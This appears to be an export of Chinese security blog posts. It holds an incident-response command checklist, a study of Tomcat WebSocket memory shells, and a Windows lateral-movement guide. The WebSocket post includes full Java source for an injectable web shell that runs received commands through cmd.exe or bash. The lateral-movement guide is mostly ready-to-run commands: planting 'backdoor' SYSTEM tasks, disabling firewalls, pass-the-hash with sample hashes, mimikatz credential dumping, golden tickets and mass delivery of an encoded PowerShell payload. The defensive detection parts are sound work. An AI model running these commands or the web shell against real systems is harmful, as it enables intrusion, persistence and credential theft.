[{"categories":["note"],"content":"常见的应急响应事件分类：\n Web入侵：网页挂马、主页篡改、Webshell 系统入侵：病毒木马、勒索软件、远控后门 网络攻击：DDOS攻击、DNS劫持、ARP欺骗  具体情况具体分析，如果是一台失陷的公网Web主机，那么着重从Web服务层面去排查，如果是内网一台Windows，那么着重从系统层面去排查，原则上能用工具则用工具\nLinux 敏感目录  /tmp /etc/init.d/ 自启动目录 web目录  ls -ltha列举所有文件\n基于时间和权限的筛选\nfind ./ -mtime 0 -name \"*.php\"\r# 查找24h内修改的php文件\rfind ./ -iname \"*.php\" -perm 777\r# -iname 忽略大小写，-perm查找777权限\r网络连接与进程 netstat -pantl\rnetstat -anpt\rnetstat -pantl | grep \"ESTABLISHED\"查看正在建立连接的端口\r查看进程对应的文件\nps aux ps aux | grep ${PID}\rlsof -i:${PORT} # 查看占用端口的进程号\rkill -9 ${PID} # killall php-fpm # 杀死所有php-fpm进程\r登录与用户 last -i | grep -v 0.0.0.0 # 查看登录日志，筛选非本地登录\rw # 看现在那些用户登陆了\rcat /etc/passwd | grep \"0:0\"\rawk -F: '$3==0{print $1}' /etc/passwd # 查询特权用户\rawk '/\\$1|\\$6/{print $1}' /etc/shadow # 查询可以远程登录的账号\rmore /etc/sudoers | grep -v \"^#\\|^$\" grep \"ALL=(ALL)\" # 查询具有sudo权限的账号\r历史命令 history\rcat ~/.bash_history\rcat /root/.bash_history\r 注意 .bash_history 要当ssh session正常退出之后才会写入，如果是非正常退出的话不会写入\n 计划任务 crontab -e\rcrontab -l\r可以用工具解析\n启动项、预加载文件 自启动服务\nls /etc/init.d/ # 自启动服务\r/etc/init.d/xxx status #查看状态\rupdate-rc.d disable # 取消开机自启\r开机启动项\nmore /etc/rc.local\r/etc/rc.d/rc[0-6].d\rls -l /etc/rc.d/rc3.d/\r开机预加载的文件\n 系统级别  /etc/profile /etc/paths   用户级别  ~/.bash_profile （mac用的） ~/.bash_login ~/.profile ~/.bashrc (linux用的)    Windows 网络连接 netstat -ano 如果网络连接出现以下情况，则当前主机可能已经失陷\n 主机存在对内网网段大量主机的某些端口（常见如22，445，3389，6379等端口）或者全端口发起网络连接尝试，这种情况一般是当前主机被攻击者当作跳板机对内网实施端口扫描或者口令暴力破解等攻击。 主机和外网IP已经建立连接（ESTABLISHED状态）或者尝试建立连接（SYN_SENT状态），可以先查询IP所属地，如果IP为国外IP或者归属各种云厂商，则需要重点关注。进一步可以通过威胁情报（https://x.threatbook.cn等）查询IP是否已经被标注为恶意IP。 如果无法直接从网络连接情况判断是否为异常连接，可以根据网络连接找到对应的进程ID，判断进程是否异常。如果不能从进程判断，可以进一步找到进程对应文件，将对应文件上传至virustotal（https://www.virustotal.com）进行检测。  windows通过进程找到文件路径:\n# 打开所有端口进程列表\rnetstat -ano\r# 找到可以的端口链接\rnetstat -ano | findstr 13232\r# 通过pid找到进程\rtasklist | findstr 13232\r# 通过进程找到文件路径\rwmic process where name=\"firefox.exe\" get processid,executablepath,name\rwmic process get name,executablepath,processid|findstr 2860\r敏感目录  各个盘符下的临时目录，如 C:\\TEMP、C:\\Windows\\Temp等。 攻击队喜欢放马的目录，比如 C:\\Users\\Public 下的各个目录 浏览器的下载目录 %UserProfile%\\Recent，查看用户最近操作的文件 回收站，如C盘下回收站C:\\$Recycle.Bin web目录  记得按照时间排序，来查看最近修改的文件夹\n后门帐号 注册表 查看注册表中HKLM\\SAM\\SAM\\Domains\\Account\\Users\\Names （或者HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names）中是否有多余的账号（可询问客户运维人员以确定账号存在的必要性）。\n 正常情况下，上述路径的SAM权限仅system用户可查看，需要给administrator用户授权才能打开完整路径。对SAM右键、给administator用户添加完全控制权限，记得改回去\n 下图 admin$ 即为后门账号\n计算机管理\ncompmgmt.msc # 查看用户和用户组\rlusrmgr.msc # 查看用户和用户组\rnet命令\n1 2 3  net user # 查询本机用户 net localgroup Administrators # 查询admin组 query user # 查询登录用户   启动项 启动目录\n%programdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup # 系统启动目录\r%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup # 用户登陆时启动目录\r注册表\n太多了，就说一两个：\n  Run注册表键值为开机启动项,每一次开机都会执行键值对应的程序或bat脚本\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\r  Logon Scripts是优先于很多杀毒软件启动的,所以可以通过这种方式达到一定的免杀效果\n在注册表HKEY_CURRENT_USER\\Environment这条路径下,添加新的字符串值,值的名字为:UserInitMprLogonScript，数值数据为想要启动程序的路径\n  另外\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\run\rHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\rHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce\r   注册表项很多，建议使用火绒剑一把梭\n 计划任务、服务  同样建议火绒剑一把梭\n taskschd.msc # 计划任务查看器\rschtasks # 命令行查看计划任务\rservices.msc # 服务查看器\rsysteminfo # 查询补丁信息\reventvwr.msc # 事件查看器（查看系统日志，安全日志）\r","description":"大行动后应急响应狗的随手记","tags":["应急响应"],"title":"应急响应笔记","uri":"/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0/"},{"categories":["note"],"content":"本文首发跳跳糖：《Tomcat WebSocket内存马原理浅析》\n周末和N1k0la师傅看到了这个repo：wsMemShell，决定来研究一番。\n正好某大行动要开始了，希望此文能抛砖引玉，给师傅们带来一些启发。文章写的不好，疏漏之处细节欢迎师傅们指正。\nTomcat WebSocket的实现 Tomcat自7.0.2版本开始支持WebSocket，采用自定义API，即WebSocketServlet。\n从2013年有了JSR356标准之后，Tomcat自7.0.47版本废弃自定义的API，实现了Java WebSocket规范（JSR356 ）\n根据JSR356规定， 建立WebSocket连接的服务器端和客户端，两端对称，可以互相通信。把通信端点抽象成类，就是Endpoint，每一个Endpoint对象代表WebSocket链接的一端，服务器端的叫ServerEndpoint，客户端的叫ClientEndpoint。客户端向服务端发送WebSocket握手请求，建立连接后就创建一个ServerEndpoint对象。\nServerEndpoint和ClientEndpoint，有相同的生命周期事件（OnOpen、OnClose、OnError、OnMessage），不同之处是ServerEndpoint作为服务器端点，可以指定一个URI路径供客户端连接，ClientEndpoint则没有。\nEndpoint对象的生命周期方法如下：\n onOpen：当开启一个新的会话时调用。这是客户端与服务器握手成功后调用的方法，等同于注解@OnOpen。 onClose：当会话关闭时调用。等同于注解@OnClose。 onError：当链接过程中异常时调用。等同于注解@OnError。 onMessage：接收到消息时触发。等同于注解@OnMessage  服务端实现Endpoint的方式 服务器端的Endpoint有两种实现方式，一种是注解方式@ServerEndpoint，一种是继承抽象类Endpoint。\n注解方式：@ServerEndpoint 官方文档：ServerEndpoint (Java(TM) EE 7 Specification APIs)\n一个@ServerEndpoint注解应该有以下元素：\n value：必要，String类型，此Endpoint部署的URI路径。 configurator：非必要，继承ServerEndpointConfig.Configurator的类，主要提供ServerEndpoint对象的创建方式扩展（如果使用Tomcat的WebSocket实现，默认是反射创建ServerEndpoint对象）。 decoders：非必要，继承Decoder的类，用户可以自定义一些消息解码器，比如通信的消息是一个对象，接收到消息可以自动解码封装成消息对象。 encoders：非必要，继承Encoder的类，此端点将使用的编码器类的有序数组，定义解码器和编码器的好处是可以规范使用层消息的传输。 subprotocols：非必要，String数组类型，用户在WebSocket协议下自定义扩展一些子协议。  比如：\n1  @ServerEndpoint(value = \"/ws/{userId}\", encoders = {MessageEncoder.class}, decoders = {MessageDecoder.class}, configurator = MyServerConfigurator.class)   @ServerEndpoint可以注解到任何类上，但是想实现服务端的完整功能，还需要配合几个生命周期的注解使用，这些生命周期注解只能注解在方法上：\n @OnOpen 建立连接时触发。 @OnClose 关闭连接时触发。 @OnError 发生异常时触发。 @OnMessage 接收到消息时触发。  继承抽象类：Endpoint 继承抽象类Endpoint，重写几个生命周期方法，实现两个接口，比加注解 @ServerEndpoint方式更麻烦。\n其中重写onMessage需要实现接口jakarta.websocket.MessageHandler，给Endpoint分配URI路径需要实现接口jakarta.websocket.server.ServerApplicationConfig。\n而URI path、encoders、decoders、configurator等配置信息由jakarta.websocket.server.ServerEndpointConfig管理，默认实现jakarta.websocket.server.DefaultServerEndpointConfig。\n通过编程方式实现Endpoint，比如：\n1  ServerEndpointConfig serverEndpointConfig = ServerEndpointConfig.Builder.create(WebSocketServerEndpoint3.class, \"/ws/{userId}\").decoders(decoderList).encoders(encoderList).configurator(new MyServerConfigurator()).build();   Tomcat WebSocket的加载 Tomcat提供了一个javax.servlet.ServletContainerInitializer的实现类org.apache.tomcat.websocket.server.WsSci。\n ServletContainerInitializer（SCI） 是 Servlet 3.0 新增的一个接口，主要用于在容器启动阶段通过编程风格注册Filter, Servlet以及Listener，以取代通过web.xml配置注册。这样就利于开发内聚的web应用框架.\n具体可看：Servlet3.0研究之ServletContainerInitializer接口\n 因此Tomcat的WebSocket加载是通过SCI机制完成的。\nWsSci可以处理的类型有三种：\n 添加了注解@ServerEndpoint的类 Endpoint的子类 ServerApplicationConfig的实现类  Tomcat在Web应用启动时会在StandardContext的startInternal方法里通过 WsSci 的onStartup方法初始化 Listener 和 servlet，再扫描 classpath下带有注解@ServerEndpoint的类和Endpoint子类\n如果当前应用存在ServerApplicationConfig实现，则通过ServerApplicationConfig获取Endpoint子类的配置（ServerEndpointConfig实例，包含了请求路径等信息）和符合条件的注解类，通过调用addEndpoint将结果注册到WebSocketContainer上；如果当前应用没有定义ServerApplicationConfig的实现类，那么WsSci默认只将所有扫描到的注解式Endpoint注册到WebSocketContainer。因此，如果采用可编程方式定义Endpoint，那么必须添加ServerApplicationConfig实现。\n然后startInternal方法里为ServletContext添加一个过滤器org.apache.tomcat.websocket.server.WsFilter，它用于判断当前请求是否为WebSocket请求，以便完成握手（所以任何Tomcat都可以用java-memshell-scanner看到WsFilter）。\nTomcat WebSocket内存马的实现 我们先来回顾一下servlet-api型内存马的实现步骤，拿Filter型举例：\n 获取当前的StandardContext 创建恶意Filter 创建filterDef封装Filter对象，调用StandardContext.addFilterDef方法将filterDef添加到filterDefs 创建filterMap将URL和filter进行绑定，调用StandardContext.addFilterMapBefore方法将filterMap添加到filterMaps中 获取filterConfigs变量，并向其中添加filterConfig对象  既然要插入恶意Filter，那么我们就需要在Tomcat启动过程中寻找添加FIlter的方法，而filterDef、filterMap、filterConfigs都是StandardContext对象的属性，并且也有相应的add方法，那么我们就需要先获取StandardContext，再调用相应的方法。\nWebSocket内存马也很类似，上一节提到了WsSci 的onStartup扫描 classpath下带有注解@ServerEndpoint的类和Endpoint子类，并且调用addEndpoint方法注册到WebSocketContainer上。那么我们应该从WebSocketContainer出发，而WsServerContainer是在StandardContext里面创建的，那么，显而易见的：\n 获取当前的StandardContext 通过StandardContext获取ServerContainer 定义一个恶意类，并创建一个ServerEndpointConfig，给这个恶意类分配URI path 调用ServerContainer.addEndpoint方法，将创建的ServerEndpointConfig添加进去  1 2 3  ServerContainer container = (ServerContainer) req.getServletContext().getAttribute(ServerContainer.class.getName()); ServerEndpointConfig config = ServerEndpointConfig.Builder.create(evil.class, \"/ws\").build(); container.addEndpoint(config);   demo 将注入内存马的操作放在static块，加载这个类即可实现内存马注入\nevil.java:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57  import org.apache.catalina.core.StandardContext; import org.apache.catalina.loader.WebappClassLoaderBase; import org.apache.tomcat.websocket.server.WsServerContainer; import javax.websocket.*; import javax.websocket.server.ServerContainer; import javax.websocket.server.ServerEndpointConfig; import java.io.InputStream; public class evil extends Endpoint implements MessageHandler.Whole\u003cString\u003e { static { WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext(); ServerEndpointConfig build = ServerEndpointConfig.Builder.create(evil.class, \"/evil\").build(); WsServerContainer attribute = (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName()); try { attribute.addEndpoint(build); // System.out.println(\"ok!\");  } catch (DeploymentException e) { throw new RuntimeException(e); } } private Session session; public void onMessage(String message) { try { boolean iswin = System.getProperty(\"os.name\").toLowerCase().startsWith(\"windows\"); Process exec; if (iswin) { exec = Runtime.getRuntime().exec(new String[]{\"cmd.exe\", \"/c\", message}); } else { exec = Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\", message}); } InputStream ips = exec.getInputStream(); StringBuilder sb = new StringBuilder(); int i; while((i = ips.read()) != -1) { sb.append((char)i); } ips.close(); exec.waitFor(); this.session.getBasicRemote().sendText(sb.toString()); } catch (Exception e) { e.printStackTrace(); } } @Override public void onOpen(Session session, EndpointConfig config) { this.session = session; this.session.addMessageHandler(this); } }   效果：\nWebSocket内存马的检测方法 addEndpoint之后，可以在wsServerContainer里面有个configExactMatchMap属性里面找到Endpoint\n只需要想办法拿到这个configExactMatchMap里面的config，然后就可以调用getPath等方法就可以拿到endpoint的各种属性，以此来判别是否为内存马\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  public synchronized List\u003cServerEndpointConfig\u003e getEndpointConfigs(HttpServletRequest request) throws Exception { ServerContainer sc = (ServerContainer) request.getServletContext().getAttribute(ServerContainer.class.getName()); Field _configExactMatchMap = sc.getClass().getDeclaredField(\"configExactMatchMap\"); _configExactMatchMap.setAccessible(true); ConcurrentHashMap configExactMatchMap = (ConcurrentHashMap) _configExactMatchMap.get(sc); Class _ExactPathMatch = Class.forName(\"org.apache.tomcat.websocket.server.WsServerContainer$ExactPathMatch\"); Method _getconfig = _ExactPathMatch.getDeclaredMethod(\"getConfig\"); _getconfig.setAccessible(true); List\u003cServerEndpointConfig\u003e configs = new ArrayList\u003c\u003e(); Iterator\u003cMap.Entry\u003cString, Object\u003e\u003e iterator = configExactMatchMap.entrySet().iterator(); while (iterator.hasNext()) { Map.Entry\u003cString, Object\u003e entry = iterator.next(); ServerEndpointConfig config = (ServerEndpointConfig)_getconfig.invoke(entry.getValue()); configs.add(config); } return configs; } configs = getEndpointConfigs(request); for (ServerEndpointConfig cfg : configs) { System.out.println(cfg.getPath())； System.out.println(cfg.getEndpointClass().getName())； System.out.println(cfg.getEndpointClass().getClassLoader().getClass().getName())； System.out.println(classFileIsExists(cfg.getEndpointClass()))； System.out.println(cfg.getEndpointClass().getName())； System.out.println(cfg.getEndpointClass().getName()))); }   已PR到：java-memshell-scanner\n说句题外话：有一说一，用Tomcat起WebSocket服务不是那么常见，如果发现了有注册的Endpoint的话，蓝队们还需要谨慎对待。\n参考 WebSocket 内存马，一种新型内存马技术\nServlet3.0研究之ServletContainerInitializer接口\nwebsocket之三：Tomcat的WebSocket实现 - duanxz\nWebSocket通信原理和在Tomcat中实现源码详解\n","description":"","tags":["内存马","Tomcat"],"title":"Tomcat WebSocket内存马原理浅析","uri":"/posts/tomcat-websocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"},{"categories":["note"],"content":"IPC连接  条件：\n1、目标机开启了139和445端口；\n2、目标主机管理员开启了ipc$默认共享；\n3、知道目标机的（权限足够的）账户密码。\n4、NT或以上操作系统\n IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。\n利用IPC$,连接者甚至可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。\n命令：\nnet use \\\\192.168.10.2\\ipc$ /user:\"username\" \"password\"\r//建立ipc连接\rnet use \\\\192.168.10.2 /u:domainname\\username \"password\"\r// 域中建立ipc连接\rnet use \\\\192.168.10.2 /de /y // 删除ipc连接(使用完之后记得删除)\r用IPC进行文件目录操作 net view \\\\192.168.10.2 //查看共享目录\rnet view \\\\192.168.10.2\\c$\\users //列出指定目录文件\rcopy shell.exe \\\\192.168.10.2\\C$\\windows\\temp\\ //复制文件到目标目录\rcopy \\\\192.168.10.2\\C$\\windows\\temp\\hash.txt //下载文件到当前目录\rnet use z: \\\\192.168.10.2\\c$ \"密码\" /user:\"用户名\" //将对方的c盘映射为自己的z盘\rIPC常见错误号 1.错误号5，拒绝访问：很可能你使用的用户不是管理员权限的，先提升权限；\r2.错误号51，Windows 无法找到网络路径：网络有问题；\r3.错误号53，找不到网络路径：ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）；\r4.错误号67，找不到网络名：你的lanmanworkstation服务未启动；目标删除了ipc$；\r5.错误号1219，提供的凭据与已存在的凭据集冲突：你已经和对方建立了一个ipc$，请删除再连。\r6.错误号1326，未知的用户名或错误密码：原因很明显了；\r7.错误号1792，试图登录，但是网络登录服务没有启动：目标NetLogon服务未启动。（连接域控会出现此情况）\r8.错误号2242，此用户的密码已经过期：目标有帐号策略，强制定期要求更改密码。\rWindows计划任务 1.先建立IPC连接\n2.确定目标主机DC的当前时间\nnet time \\\\192.168.10.2\r3.拷贝木马到目标机器\ncopy shell.exe \\\\192.168.10.2\\C$\\windows\\temp\\\r4\t.创建计划任务\nVista 和 Server 2008 之后：\n 在使用schtasks命令时，会在系统中留下日志文件C:\\Windows\\Tasks\\SchedLgU.txt（记得删）\n schtasks /create /s 192.168.10.2 /tn backdoor /sc minute /mo 1 /tr c:\\shell.exe /ru system /f\r// 创建一个名称为\"backdoor\"的计划任务。该计划任务每分钟启动一次，启动程序为c:\\shell.exe，启动权限为system\rschtasks /run /s 192.168.10.2 /i /tn backdoor\r// i：忽略任何限制立即运行任务\rschtasks /delete /s 192.168.10.2 /tn \"backdoor\" /f\r// 强制删除名称为\"backdoor\"计划任务（记得删）\r在没有建立ipc连接时，要加上/u和/p参数分别设置用户名(域中为域\\域用户)和密码。 如果因为权限或组策略设置等原因报错拒绝访问，要加上/u和/p参数分别设置高权限用户名和密码。\nVista 和 Server 2008 之前：\nat \\\\192.168.10.2 15:47:00 c:\\beacon.exe //创建计划任务\rat \\\\192.168.10.2 1 /delete //删除ID为1的计划任务\rWindows服务  条件：\n1、当前跳板机用户具有管理员权限(因为要创建服务)。\n2、与目标机器已经建立ipc连接\n 1.建立IPC连接\n2.拷贝木马到目标机器\ncopy shell.exe \\\\192.168.10.2\\C$\\windows\\temp\\\r3.在目标主机DC上创建一个名称为“backdoor”的服务。命令如下：\nsc \\\\[主机名 or IP] create [servicename] binpath= \"[path]\" //创建计划任务启动程序\r注意这里的格式，“=” 后面是必须空一格的，否则会出现错误。\n4.立即启动该服务：\nsc \\\\192.168.10.2 start bindshell\r5.删除刚才创建的服务\nsc \\\\192.168.10.2 delete bindshell\r我们还可以通过设置服务来关闭防火墙：\nsc \\\\WIN-ENS2VR5TR3N create unablefirewall binpath= \"netsh advfirewall set allprofiles state off\"\rsc \\\\WIN-ENS2VR5TR3N start unablefirewall\r通过smb服务横向移动  利用条件\n1、445端口开放\n2、知道账号密码明文或hash\n 利用 SMB 服务可以通过明文或 hash 传递（PTH）来远程执行。\n明文传递 PsExec.exe(微软官方工具)  使用条件\n1.对方主机开启了 admin$ 共享，如果关闭了admin$共享，会提示：找不到网络名\n2.对方未开启防火墙\n3.如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。\n4.如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用户，连接域控只能用域管理员账户。\n 执行原理(会留下大量日志)：\n 通过ipc$连接，释放psexecsvc.exe到目标 通过服务管理SCManager远程创建psexecsvc服务，并启动服务。 客户端连接执行命令，服务端启动相应的程序并执行回显数据。 运行完后删除服务。这个在windows的日志中有详细的记录，另外psexec在少数情况下会出现服务没删除成功的bug，所以一般不推荐使用psexec，推荐wmiexec  可先建立ipc连接再使用psexec无需输入密码\nnet use \\\\IP /u:domainname\\username password\r//建立IPC通道\rpsexec.exe \\\\192.168.10.2 -s cmd.exe -acceptcula\r//反弹cmd\r或者直接使用：\n.\\PsExec.exe \\\\192.168.10.201 -u domainname\\username -p password -s cmd.exe -acceptcula\r-accepteula：第一次运行psexec会弹出确认框，使用该参数就不会弹出确认框 -u：用户名 -p：密码 -s：以system权限运行运程进程，获得一个system权限的交互式shell。如果不使用该参数，会获得一个连接所用用户权限的shell\nPTH-哈希传递  利用条件\n1、在工作组环境中：\nWindows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。\nWindows Vista 之后的机器，只能是administrator用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问\n2、在域环境中：\n只能是域管理员组内用户(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器\n如果要用普通域管理员账号进行哈希传递攻击，则需要修改修改目标机器的 LocalAccountTokenFilterPolicy为1\n psexec.py-PTH  与官方psexec.exe相比会自动删除服务，增加隐蔽性\n https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py\n这里推荐使用impacket套装,有exe和py版本\npsexec.exe domain/username@10.73.147.30 -hashes 624aac413795cdc1a5c7b1e00f780017:852a844adfce18f66009b4f14e0a98de\r之后会弹回一个system权限的交互shell。\npython psexec.py administrator@10.73.147.29 -hashes 624aac413795cdc1a5c7b1e00f780017:852a844adfce18f66009b4f14e0a98de\r这种方式方便我们直接通过代理在自己本机执行(py测试2003,但exe可以成功)\nsmbexec.py https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py\npython smbexec.py ./:@192.168.52.136\rwmiexec.py-PTH https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py\npython wmiexec.py -hashes 624aac413795cdc1a5c7b1e00f780017:852a844adfce18f66009b4f14e0a98de administrator@10.73.147.29\rMiMiKatz-PTH 这个需要本地管理员权限(由Mimikatz的实现机制决定的)\nprivilege::debug\rsekurlsa::logonpasswords\r//抓取本机hash\rprivilege::debug\rsekurlsa::pth /user:administrator /domain:workgroup /ntlm:852a844adfce18f66009b4f14e0a98de\r//将获取的Hash添加进lsass中\r会弹出一个交互式的终端,这个终端以及伪造为我们指定的hash和用户，访问远程主机或服务，就不用提供明文密码了。 我们可以通过copy文件，然后执行计划任务去拿到shell(这个思路有自动化实现的工具)。\npth批量横向移动 CrackMapExec：https://github.com/byt3bl33d3r/CrackMapExec/\nCME集成了wmiexec、atexe、smbexec的方式,集成了smb扫描,口令爆破等功能,非常适合拿来快速移动。\n用cme来进行网段的smb扫描确定目标系统和smb服务\ncme smb 192.168.0.0/24 -t 255\r批量传递hash:\ncme smb 10.73.147.90 10.73.147.88 -u administrator -H 852a844adfce18f66009b4f14e0a98de\r批量执行命令:\ncme smb 10.73.147.90 10.73.147.88 -u administrator -H 852a844adfce18f66009b4f14e0a98de -x \"whoami\"\r或者执行powershell,我们可以通过CS的powershell command然后粘贴生成的payload.txt中的内容直接-x执行即可批量上马。\ncme smb 10.211.55.51 10.211.55.52 -u administrator -H 852a844adfce18f66009b4f14e0a98de -x \"powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0...\"\rWMI 横向 WMI的全名为“Windows Management Instrumentation”。从Windows 98开始，Windows操作系统都支持WMI。WMI是由一系列工具集组成的，可以通过/node选项使用端口135上的远程过程调用(RPC)进行通信以进行远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。\n “自从PsExec在内网中被严格监控后，越来越多的反病毒厂商将PsExec加入了黑名单，于是攻击者逐渐开始使用WMI进行横向移动。通过渗透测试发现，在使用wmiexec进行横向移动时，Windows操作系统默认不会将WMI的操作记录在日志中，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性。因为在这个过程中不会产生日志，所以，对网络管理员来说增加了攻击溯源的成本。而对攻击者来说，其恶意行为被发现的可能性有所降低、隐蔽性有所提高。由此，越来越多的APT开始使用WMI进行攻击，利用WMI可以进行信息收集、探测、反病毒、虚拟机检测、命令执行、权限持久化等操作。”\n  使用条件\n1、WMI服务开启，端口135，默认开启。\n2、防火墙允许135、445等端口通信。\n3、知道目标机的账户密码。\n 执行命令：\nwmic /node:191.168.52.136 /user:xxxx /password:xxxxx process call create \"cmd.exe /c ipconfig\u003ed:\\result.txt\"\r//无需上传第三方软件，利用系统内置程序,单命令执行，执行后无结果回显\rWMI常用命令 https://www.freebuf.com/articles/246440.html\n文件管理\nwmic fsdir where \"drive='c:' and filename='whoami'\" list\rwmic fsdir \"c:\\\\test\" call delete\r//删除C盘下的test目录，注意“\\”要进行一下转义\rwmic process where “NOT ExecutablePath LIKE ‘%Windows%’” GET ExecutablePath\r//枚举出整个系统中的所有可执行文件\rfor /f \"skip=1 tokens=1*\" %i in ('wmic datafile where \"FileName='qq' and extension='exe'\" get drive^,path') do (set \"qPath=%i%j\"\u0026@echo %qPath:~0,-3%)\r//wmic 全盘搜索某文件并获取该文件所在目录\r环境变量\nwmic environment get Description, VariableValue\rwmic environment where \"name='temp'\" get UserName,VariableValue\r//环境变量，获取temp环境变量\rwmic environment where \"name='path' and username='\u003csystem\u003e'\" set VariableValue=\"%path%;c:\\whoami\"\r//更改PATH环境变量值，新增c:\\whoami\r进程管理\nwmic process list brief\r//列出所有进程信息\rwmic process get processid,name,executablepath //Full显示所有、Brief显示摘要、Instance显示实例、Status显示状态\rwmic process where name=\"vmtoolsd.exe\" get executablepath\r//获取指定进程可执行文件的路径\rwmic process call create \"C:\\windows\\system32\\notepad.exe\"\r//创建进程\rwmic process call create \"cmd.exe /c 'ipconfig'\"\rwmic process call create \"shutdown.exe -r -f -t 60\"\r//根据系统命令创建进程\rwmic process where name=\"notepad.exe\" delete\rwmic process where pid=\"244\" delete //删除进程\r用户账户管理\nwmic useraccount\rwmic useraccount list brief\rwmic useraccount where \"name='%UserName%'\" call rename newUserName\r// 更改当前用户名\rwmic useraccount where \"name='Administrator'\" call Rename admin\r// 更改指定用户名\r获取补丁信息\nwmic qfe list brief\rwmic qfe get Caption,Description,HotFixID,IntsalledOn\r查看域控制器\nwmic ntdomain list brief\r查看安装的软件信息\nwmic product get name,version\r远程桌面连接 使用WMIC命令开启远程计算机的远程桌面连接：\n1 2  wmic /node:192.168.52.138 /USER:administrator PATH win32_terminalservicesetting WHERE (__Class!=\"\") CALL SetAllowTSConnections 1 // wmic /node:\"[full machine name]\" /USER:\"[domain]\\[username]\" PATH win32_terminalservicesetting WHERE (__Class!=\"\") CALL SetAllowTSConnections 1   共享管理\n1 2 3 4 5 6 7 8 9 10  wmic share list brief wmic share get name,path,status wmic share call create \"\",\"test\",\"3\",\"TestShareName\",\"\",\"c:\\whoami\",0 (可使用 WMIC SHARE CALL Create /? 查看create后的参数类型) // 建立共享 wmic share where \"name='C$'\" call delete wmic share where \"path='c:\\test'\" delete // 删除共享   wmiexec 要执行命令并回显请使用wmiexec.py，⽤445端口传回显：\n1 2  python wmiexec.py administrator:Liu78963@192.168.183.130 // python wmiexec.py 用户名:密码@目标IP   指定-hashes选项的话，则可进行哈希传递。\nexe版本命令与wmiexec.py一模一样。在跳板机上上传wmiexec.exe并运行如下命令获取目标系统192.168.52.138的shell：\n1  wmiexec.exe administrator:Liu78963@192.168.183.130   wmiexec.vbs https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs\nwmiexec.vbs脚本通过VBS调用WMI来模拟PsExec的功能。其可以在远程系统中执行命令并进行回显，获取远程主机的半交互式Shell。\nwmiexec.vbs支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式。\nPTK-密钥传递 即 Pass The Key ，当系统安装了 KB2871997 补丁且禁用了 NTLM 的时候，那我们抓取到的 ntlm hash. 也就失去了作用，但是可以通过 pass the key 的攻击方式获得权限。\n 利用条件\n1、目标主机打过KB2871997\n2、所以必须使用SID值为500的用户\n 1 2 3 4  mimikatz sekurlsa::ekeys //获取用户的aes key sekurlsa::pth /user:xxx /domain:xxx /aes256:xxxxxxxx\" //注入aes key，成功后会返回一个cmd   PTT-票据传递 MS14-068  利用条件\n1.域控没有打MS14-068的补丁(KB3011780)\n2.拿下一台加入域的计算机，并且能dump出某一域成员的用户名，密码，SID等值\n 域用户hack在域成员主机A上登录过，域成员主机A的管理员通过mimikatz得到了域用户hack的用户名，密码，SID等值，而且域控存在MS14-068漏洞，现在域成员主机A想通过MS14-068漏洞访问域控。\nhttps://github.com/abatchy17/WindowsExploits/tree/master/MS14-068\nhttps://www.cnblogs.com/-mo-/p/11890539.html\nhttps://www.cnblogs.com/yuzly/p/10859520.html\n黄金票据  利用条件\n1.域名称\n2.域的SID值\n3.域的KRBTGT账户密码HASH（通常需要SYSTEM权限才能dump）\n4.伪造用户名，可以是任意的\n kerberos协议原理参考\nNTML认证与kerberos认证与PAC相关知识\n域中每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来计算生成的，因此只要获取到了 krbtgt 用户的密码 Hash ，就可以随意伪造 Ticket ，进而使用 Ticket 登陆域控制器，使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket，此类攻击方法被称为票据传递攻击。\n首先获取krbtgt的用户hash:\n1  mimikatz \"lsadump::dcsync /domain:xx.com /user:krbtgt\"   利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下：\n1 2 3 4 5 6 7  kerberos::golden 